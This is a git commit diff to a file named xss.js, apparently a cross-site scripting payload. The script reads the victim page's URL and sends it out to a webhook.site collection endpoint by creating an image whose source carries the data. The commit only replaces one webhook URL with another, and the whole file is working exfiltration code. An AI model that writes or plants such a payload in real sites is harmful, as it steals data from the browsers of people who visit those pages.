7a418233d1eea538d0237dc278fc95885dc75d43
Dorjsambuu <hw13d036@csms.edu.mn>
2022-10-27 11:39:20 +0800

    Update xss.js

--- xss.js
+++ xss.js
@@ -2,5 +2,5 @@ var img = document.createElement("img");
 
 var data = window.location.href;
 console.log(JSON.stringify(data));
-img.src="https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data;
+img.src="https://webhook.site/4d5de934-a8c5-4c46-9e2e-0377f5ba5c76/a.png?data="+data;
 document.body.appendChild(img);
